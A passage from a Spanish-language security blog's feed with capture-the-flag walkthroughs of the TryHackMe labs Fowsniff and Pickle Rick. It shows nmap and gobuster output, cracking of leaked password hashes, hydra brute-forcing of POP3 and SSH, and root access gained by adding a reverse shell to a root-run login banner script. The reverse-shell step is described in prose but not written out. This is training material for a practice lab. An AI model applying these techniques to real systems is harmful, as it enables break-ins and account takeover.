&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; disallowed entry 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_pop3-capabilities: TOP SASL&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PLAIN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; UIDL USER AUTH-RESP-CODE PIPELINING CAPA RESP-CODES
143/tcp open  imap    Dovecot imapd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_imap-capabilities: IMAP4rev1 &lt;span class=&#34;nv&#34;&gt;AUTH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;PLAINA0001 SASL-IR Pre-login IDLE post-login have OK LITERAL+ more ENABLE capabilities LOGIN-REFERRALS ID listed
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Jun 22 18:53:29 2020 -- 1 IP address (1 host up) scanned in 1065.82 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_174034.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@upset:~/thm/fowsniff# gobuster dir -u http://fowsniff.thm/ -w /usr/share/wordlists/dirb/common.txt -q -x php,html,txt -t 25
/assets (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/LICENSE.txt (Status: 200)
/README.txt (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/security.txt (Status: 200)
/server-status (Status: 403)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;securitytxt&#34;&gt;Security.txt&lt;/h3&gt;
&lt;p&gt;Encontramos un archivo en el que indica que la pagina/empresa fue hackeada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_174430.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;twitter-fowsniff&#34;&gt;Twitter Fowsniff&lt;/h3&gt;
&lt;p&gt;Dentro de la pagina vemos un mensaje que indica que &lt;em&gt;Fowsniff&lt;/em&gt; sufrio una filtracion de datos de la empresa, incluyendo la cuenta de twitter.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_174511.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la cuenta encontramos dos tweets con direcciones hacia pastebin.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_174849.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_174831.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En uno de estos encontramos una lista de emails y hashes md5.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_175057.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos crackstation.net para crackear estos hashes. Logramos obtener el resultado de la mayoria de hashes.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_175238.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;hydratelnet---pop3&#34;&gt;HYDRA/TELNET - POP3&lt;/h2&gt;
&lt;p&gt;Utilizamos hydra con los usuarios y constraseñas que encontramos. Y logramos obtener unas credenciales que podemos utilizar en este servicio.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_181831.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos telnet con el puerto &lt;code&gt;110&lt;/code&gt; para conectarnos y utilizando los comandos de &lt;a href=&#34;https://www.shellhacks.com/retrieve-email-pop3-server-command-line/&#34;&gt;POP3&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;primer-correo&#34;&gt;Primer correo&lt;/h4&gt;
&lt;p&gt;Encontramos en uno de los correos una contraseña &lt;em&gt;temporal&lt;/em&gt; para conectarse en el servicio SSH.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@upset:~/thm/fowsniff# telnet fowsniff.thm 110
Trying 10.10.225.64...
Connected to fowsniff.thm.
Escape character is &#39;^]&#39;.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER [... spoiler ...]
+OK
PASS [... spoiler ...]
+OK Logged in.
STAT
+OK 2 2902
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: &amp;lt;[... spoiler ...]&amp;gt;
X-Original-To: [... spoiler ...]@fowsniff
Delivered-To: [... spoiler ...]@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: [... spoiler ...]
Subject: URGENT! Security EVENT!
Message-Id: &amp;lt;20180313185107.0FA3916A@fowsniff&amp;gt;
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are &amp;quot;in the shop,&amp;quot; we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is &amp;quot;[... spoiler ...]&amp;quot;

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we&#39;ll set it up.

Thanks,
A.J Stone
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;segundo-correo&#34;&gt;Segundo correo&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;RETR &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
+OK &lt;span class=&#34;m&#34;&gt;1280&lt;/span&gt; octets
Return-Path: &amp;lt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... spoiler ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
X-Original-To: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... spoiler ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Delivered-To: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... spoiler ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Received: by fowsniff &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix, from userid 1004&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
	id 101CA1AC2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; 14:54:05 -0400 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
To: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... spoiler ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Subject: You missed out!
Message-Id: &amp;lt;20180313185405.101CA1AC2@fowsniff&amp;gt;
Date: Tue, &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; 14:54:05 -0400 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
From: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... spoiler ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; a looooong &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don&lt;span class=&#34;s1&#34;&gt;&amp;#39;t know what kind of pneumonia or something you brought back with
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;you from your camping trip, but I think I&amp;#39;&lt;/span&gt;m coming down with it myself.
How long have you been gone - a week?
Next &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; you&lt;span class=&#34;s1&#34;&gt;&amp;#39;re going to get sick and miss the managerial blowout of the century,
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;at least keep it to yourself!
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;I&amp;#39;&lt;/span&gt;m going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it&lt;span class=&#34;s1&#34;&gt;&amp;#39;s probably just some
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#34;Let me explain the tone of my meeting with management&amp;#34; face-saving mail.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;I&amp;#39;&lt;/span&gt;ll &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; that right before Captain Profanity showed up.

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user---baksteen&#34;&gt;USER - BAKSTEEN&lt;/h2&gt;
&lt;p&gt;Nuevamente utilizamos hydra con los usuarios y la contraseña nueva que econtramos pero esta vez en el servicio ssh.&lt;/p&gt;
&lt;p&gt;Encontramos la contraseña del usuario &lt;em&gt;baksteen&lt;/em&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_183737.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Iniciamos sesion en el servicio ssh y obtenemos una shell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_183850.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Dentro de nuestra shell buscamos archivos que fuera interesantes que nos ayudaran a escalar privilegios, encontramos un archivo interesante en la carpeta /opt/. Al revisar este archivo encontramos que es el &amp;ldquo;banner&amp;rdquo; del servicio SSH y además el dueño del archivo es el usuario &lt;em&gt;PAREDE&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_184758.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos los archivos que pertenecen al &amp;ldquo;banner&amp;rdquo; y vemos que sí se ejecuta. Pero este archivo que ejecuta el archivo en /opt/ es el usuario root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_185407.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que el archivo es un script en bash, vamos a agregar una shell inversa, que al iniciar nuevamente con el usuario &lt;em&gt;BAKSTEEN&lt;/em&gt; en el servicio SSH se ejecuta. Logramos obtener una shell con usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_185139.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además vemos nuestra &lt;strong&gt;flag.txt&lt;/strong&gt; en la carpeta principal de root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/Screenshot_20200622_185611.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/fowsniff/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/fowsniff/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Pickle Rick</title>
        <link>https://sckull.github.io/posts/picklerick/</link>
        <pubDate>Sun, 21 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sun, 21 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/picklerick/</guid>
        <description>Pickle Rick es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Pickle Rick es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Pickle Rick&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Room&lt;/td&gt;
&lt;td&gt;Pickle Rick&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;A Rick and Morty CTF. Help turn Rick back into a human!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;90&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/tryhackme&#34;&gt;tryhackme&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80), y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sun Jun 21 01:49:13 2020 as: nmap -sV -o nmap_scan_mini picklerick.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; picklerick.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.196.129&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Jun 21 01:49:46 2020 -- 1 IP address (1 host up) scanned in 32.90 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sun Jun 21 01:49:14 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan picklerick.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; picklerick.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.196.129&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 84:2d:fc:6a:81:e4:da:21:a5:b8:8f:0f:3c:8d:74:1a &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e5:aa:df:44:6c:ad:56:d0:91:d0:43:c8:a8:30:4c:2d &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; b9:24:ea:f6:3b:3c:ba:14:58:bb:e8:7b:6c:2c:1b:53 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Rick is sup4r cool
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Jun 21 02:05:52 2020 -- 1 IP address (1 host up) scanned in 997.58 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/picklerick/Screenshot_20200621_005346.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/picklerick# gobuster dir -u http://picklerick.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt
/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/denied.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/portal.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
